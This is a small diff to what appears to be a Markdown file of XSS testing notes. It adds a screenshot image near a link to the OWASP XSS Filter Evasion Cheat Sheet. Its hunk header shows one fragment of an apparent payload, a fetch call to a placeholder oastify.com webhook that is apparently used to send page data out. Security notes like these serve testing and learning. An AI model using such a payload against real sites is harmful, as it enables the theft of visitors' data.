@@ -360,4 +360,6 @@ fetch('https://your-webhook-url.oastify.com', {
 **XSS Filter Evasion Cheat Sheet**
 - [OWASP XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
 
+<img width="1116" height="348" alt="Screenshot From 2025-07-26 22-36-29" src="https://github.com/user-attachments/assets/39b890d4-b65a-47f4-8a0b-14208a1b5342" />
+
 ---
